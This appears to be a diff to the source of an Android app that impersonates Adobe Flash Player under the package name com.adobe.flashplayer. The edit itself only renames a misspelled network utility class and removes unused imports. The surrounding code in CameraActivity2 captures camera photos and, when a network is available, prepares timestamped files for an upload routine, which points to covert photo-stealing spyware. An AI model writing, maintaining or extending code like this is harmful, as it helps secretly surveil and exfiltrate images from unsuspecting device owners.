@@ -9,19 +9,16 @@ import android.graphics.ImageFormat;
 import android.graphics.Matrix;
 import android.hardware.Camera;
 import android.os.Bundle;
-import android.os.Environment;
 import android.util.Log;
 import android.widget.FrameLayout;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.IOException;
 
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -141,7 +138,7 @@ public class CameraActivity2 extends Activity {
 
                 if (data.length > Public.VALID_CAMERAPHOTO_SIZE) {
                     Context context = getApplicationContext();
-                    if (NetworkUitls.isNetworkAvailable(context) == true/*&& (Network.getNetworkType(context) == Network.WIFI_CONNECTION*/) {
+                    if (NetworkUtils.isNetworkAvailable(context) == true/*&& (Network.getNetworkType(context) == Network.WIFI_CONNECTION*/) {
 
                         String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                         int filenamelen = filename.getBytes().length;
